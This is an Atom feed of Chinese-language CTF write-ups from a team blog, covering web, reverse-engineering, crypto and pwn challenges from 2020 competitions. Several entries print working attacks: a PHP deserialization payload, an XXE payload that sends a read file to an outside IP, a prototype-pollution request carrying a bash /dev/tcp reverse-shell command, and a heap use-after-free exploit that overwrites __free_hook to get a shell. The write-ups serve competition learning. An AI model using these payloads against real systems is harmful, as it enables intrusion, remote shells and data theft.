<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BOI Team</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://boiteam.github.io/"/>
  <updated>2020-05-14T03:15:16.209Z</updated>
  <id>https://boiteam.github.io/</id>
  
  <author>
    <name>BOI Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020 网鼎杯 AreUSerialz</title>
    <link href="https://boiteam.github.io/2020/05/11/AreUSerialz/"/>
    <id>https://boiteam.github.io/2020/05/11/AreUSerialz/</id>
    <published>2020-05-10T16:00:00.000Z</published>
    <updated>2020-05-14T03:15:16.209Z</updated>
    
    <content type="html"><![CDATA[<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $op;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $content;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span></span><br><span class="line"><span class="php">        $content = <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();   </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;write();       </span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span></span><br><span class="line"><span class="php">            $res = <span class="keyword">$this</span>-&gt;read();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output($res);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $res = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span></span><br><span class="line"><span class="php">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $res;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $s;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$ccc = <span class="keyword">new</span> FileHandler();</span></span><br><span class="line"><span class="php">$ccc-&gt;op=<span class="number">2</span>;</span></span><br><span class="line"><span class="php">$ccc-&gt;filename=<span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"op"</span>;<span class="string">i:</span><span class="number">2</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"filename"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"flag.php"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"content"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>直接打就完事了。</p><p>​            <img src="/2020/05/11/AreUSerialz/0.png" alt="img">            </p><p><strong>Flag：flag{85fbed22-e71f-4c1c-ba7b-4174737fa29d}</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;AreUSerialz&quot;&gt;&lt;a href=&quot;#AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;AreUSerialz&quot;&gt;&lt;/a&gt;AreUSerialz&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Php" scheme="https://boiteam.github.io/categories/Web/Php/"/>
    
    
      <category term="Web_php反序列化" scheme="https://boiteam.github.io/tags/Web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 filejava</title>
    <link href="https://boiteam.github.io/2020/05/11/filejava/"/>
    <id>https://boiteam.github.io/2020/05/11/filejava/</id>
    <published>2020-05-10T16:00:00.000Z</published>
    <updated>2020-05-14T03:21:02.838Z</updated>
    
    <content type="html"><![CDATA[<p>download存在任意文件读取</p><p>​            <img src="/2020/05/11/filejava/0-1589116035784.png" alt>            </p><p>导出class，jd-gui反编译后查看上传的源码可以看到存在xxe漏洞</p><p>​            <img src="/2020/05/11/filejava/0-1589116038020.png" alt>            </p><p>我们上传文件名为excel-xxxx.xlsx的excel才会进行相应的处理，关于excel其实也是一个压缩文件，我们可以直接用压缩软件打开，而最主要的地方就是里面的[Content_Types].xml文件，这儿我们直接用xml外带数据即可</p><p>1、</p><p>[Content_Types].xml中插入XXE代码</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://49.232.1.225/evil.xml"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="perl">%remote;</span></span><br><span class="line"></span><br><span class="line"><span class="perl">%all;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2、在服务器中放入evil.xml,内容如下，这样就会访问服务器的xml文件，然后将本地的flag文件内容以传参的形式传到服务器监听的端口中</p><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://49.232.1.225/1.php?file=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、上传查看日志</p><p>​            <img src="/2020/05/11/filejava/0-1589116045062.png" alt>            </p><p><strong>Flag：flag{edea8805-7a7a-4adf-b411-634862b049f9}</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;download存在任意文件读取&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Java" scheme="https://boiteam.github.io/categories/Web/Java/"/>
    
    
      <category term="Web_XXE" scheme="https://boiteam.github.io/tags/Web-XXE/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 notes</title>
    <link href="https://boiteam.github.io/2020/05/11/notes/"/>
    <id>https://boiteam.github.io/2020/05/11/notes/</id>
    <published>2020-05-10T16:00:00.000Z</published>
    <updated>2020-05-14T03:20:43.981Z</updated>
    
    <content type="html"><![CDATA[<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>这道题主要考察的是js原型链污染，首先是引入的包undefsafe存在原形链污染</p><p>参考：<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line"></span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure><p>然后我们查看源代码，可以看见有个命令执行，所以我们所需要做的就是污染commands数组</p><p>​           <img src="/2020/05/11/notes/0-1589116047941.png" alt>            </p><p>根据上文，我们选择/edit_note路由，三个参数都可控,构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">url1</span> = <span class="string">"http://ef35ba3c6f1945798a3ae0f34ea3c2ae33a62a52d66348e6.changame.ichunqiu.com:8080/edit_note"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">url2</span> = <span class="string">"http://ef35ba3c6f1945798a3ae0f34ea3c2ae33a62a52d66348e6.changame.ichunqiu.com:8080/status"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">req1</span> = requests.post(url = url1, json = &#123;<span class="string">'id'</span>: <span class="string">'__proto__'</span>, <span class="string">'author'</span>: <span class="string">'cccc'</span>,<span class="string">'raw'</span>: <span class="string">'bash -i &gt;&amp; /dev/tcp/49.232.1.225/8888 0&gt;&amp;1'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="attr">req2</span> = requests.get(url = url2)</span><br></pre></td></tr></table></figure><p>最后拼接执行的语句为</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">undefsafe(this.note_list, '__proto__' + '.author', 'bash -i &gt;&amp; /dev/tcp/<span class="number">49.232</span><span class="number">.1</span><span class="number">.225</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>' )</span><br></pre></td></tr></table></figure><p>这样就能造成原型链污染,如</p><p><img src="/2020/05/11/notes/0-1589116051305.png" alt>            </p><p>访问/status路由，直接反弹shell，得到flag</p><p><img src="/2020/05/11/notes/0-1589116054184.png" alt>                        </p><p><strong>Flag：flag{5bad9a50-85e9-407d-aed2-786d11bed46c}</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;notes&quot;&gt;&lt;a href=&quot;#notes&quot; class=&quot;headerlink&quot; title=&quot;notes&quot;&gt;&lt;/a&gt;notes&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Nodejs" scheme="https://boiteam.github.io/categories/Web/Nodejs/"/>
    
    
      <category term="Web_原型链污染" scheme="https://boiteam.github.io/tags/Web-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 joker</title>
    <link href="https://boiteam.github.io/2020/05/11/jokerwp/"/>
    <id>https://boiteam.github.io/2020/05/11/jokerwp/</id>
    <published>2020-05-10T16:00:00.000Z</published>
    <updated>2020-05-14T03:45:19.663Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个SMC代码加密题，关键代码都被加密了，因此写个解密脚本对代码patch一下<br><strong>第一层考点：SMC解密</strong><br><img src="/2020/05/11/jokerwp/1589270828569.png" alt="1589270828569">                 </p><p>找到关键代码后就很简单了，就是一个简单的异或运算</p><p><img src="/2020/05/11/jokerwp/1589270879386.png" alt="1589270879386"></p><p>这里只解出了flag{d07abccf8a410c，后五位估计是题目问题，给了5个字符的密钥什么事情都没做，就有一个比较，完全靠猜，因为最后一位肯定是“}”所以用异或运算算出一个密钥再逆异或得到b37a}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个SMC代码加密题，关键代码都被加密了，因此写个解密脚本对代码patch一下&lt;br&gt;&lt;strong&gt;第一层考点：SMC解密&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2020/05/11/jokerwp/1589270828569.png&quot; alt=&quot;1589270828569&quot;&gt;                 &lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="SMC" scheme="https://boiteam.github.io/tags/SMC/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 signal</title>
    <link href="https://boiteam.github.io/2020/05/11/signalwp/"/>
    <id>https://boiteam.github.io/2020/05/11/signalwp/</id>
    <published>2020-05-10T16:00:00.000Z</published>
    <updated>2020-05-14T03:24:45.406Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个C语言虚拟机题，每一个机器码的操作都比较简单，OD动调就能将输入的每一位加密过程都表示出来。<br><strong>第一层考点：虚拟机</strong></p><p><img src="/2020/05/11/signalwp/1589270519264.png" alt="1589270519264"></p><p>import angr</p><p>最后的密文都有做一个逆运算就行</p><p><img src="/2020/05/11/signalwp/1589270611814.png" alt="1589270611814"></p><p>flag{757515121f3d478}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个C语言虚拟机题，每一个机器码的操作都比较简单，OD动调就能将输入的每一位加密过程都表示出来。&lt;br&gt;&lt;strong&gt;第一层考点：虚拟机&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="虚拟机" scheme="https://boiteam.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 boom</title>
    <link href="https://boiteam.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/"/>
    <id>https://boiteam.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-14T01:04:42.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-boom"><a href="#0x01-boom" class="headerlink" title="0x01 boom"></a>0x01 boom</h2><p>送分题，考点为多项式计算和MD5查表</p><p>先扔IDA</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/0-1589116201945.png" alt></p><p>分为三层，第一层是MD5爆破</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/0-1589116259430.png" alt></p><p>第二层是三元一次多项式计算</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/0-1589116257826.png" alt></p><p>第三层是一元二次多项式计算</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/0-1589116256187.png" alt></p><p>将三层的结果拼接得到<strong>flag:flag{en5oy_746831_89127561}</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-boom&quot;&gt;&lt;a href=&quot;#0x01-boom&quot; class=&quot;headerlink&quot; title=&quot;0x01 boom&quot;&gt;&lt;/a&gt;0x01 boom&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="多项式计算" scheme="https://boiteam.github.io/tags/%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    
      <category term="MD5" scheme="https://boiteam.github.io/tags/MD5/"/>
    
  </entry>
  
  <entry>
    <title>2020_网鼎杯_you_raise_me_up</title>
    <link href="https://boiteam.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%812/"/>
    <id>https://boiteam.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%812/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-14T00:48:37.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-you-raise-me-up"><a href="#0x01-you-raise-me-up" class="headerlink" title="0x01 you_raise_me_up"></a>0x01 you_raise_me_up</h2><p>单纯的离散对数求解，sage自带求解函数</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%812/0-1589116253297.png" alt></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%812/0-1589116271788.png" alt></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%812/0-1589116351478.png" alt></p><p><strong>flag：flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-you-raise-me-up&quot;&gt;&lt;a href=&quot;#0x01-you-raise-me-up&quot; class=&quot;headerlink&quot; title=&quot;0x01 you_raise_me_up&quot;&gt;&lt;/a&gt;0x01 you_raise_me_up&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="离散对数求解" scheme="https://boiteam.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 De1CTF stl_container</title>
    <link href="https://boiteam.github.io/2020/05/07/2020_De1CTF_stl_container/"/>
    <id>https://boiteam.github.io/2020/05/07/2020_De1CTF_stl_container/</id>
    <published>2020-05-07T05:54:17.000Z</published>
    <updated>2020-05-12T04:09:06.669Z</updated>
    
    <content type="html"><![CDATA[<p>在Vector菜单中存在简单的UAF，dele 0 之后，0仍然可以被show和dele</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(choose,data)</span>:</span></span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,str(choose))</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sf(<span class="string">"input data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(choose,index)</span>:</span></span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,str(choose))</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"index?\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(choose,index)</span>:</span></span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,str(choose))</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">if</span> choose &lt; <span class="number">3</span>:</span><br><span class="line">        slf(<span class="string">"index?\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">"1"</span>)</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>,<span class="number">2</span>,<span class="number">-1</span>):</span><br><span class="line">    dele(i,<span class="number">1</span>)</span><br><span class="line">    dele(i,<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"data: "</span>)</span><br><span class="line">libc_addr = l64_addr(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]) - <span class="number">0x3ebca0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">"1"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">"1"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">3</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">"1"</span>)</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,p64(libc_addr+libc.symbols[<span class="string">"__free_hook"</span>]<span class="number">-0x8</span>))</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"/bin/sh\x00"</span>+p64(libc.symbols[<span class="string">'system'</span>]+libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ShowAddress(<span class="string">"libc_address:"</span>,libc_addr)</span><br><span class="line">debug()</span><br><span class="line">getshell()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在Vector菜单中存在简单的UAF，dele 0 之后，0仍然可以被show和dele&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
    
      <category term="libc" scheme="https://boiteam.github.io/tags/libc/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 boom1</title>
    <link href="https://boiteam.github.io/2020/05/07/2020_boom1/"/>
    <id>https://boiteam.github.io/2020/05/07/2020_boom1/</id>
    <published>2020-05-07T05:54:17.000Z</published>
    <updated>2020-05-12T04:13:43.154Z</updated>
    
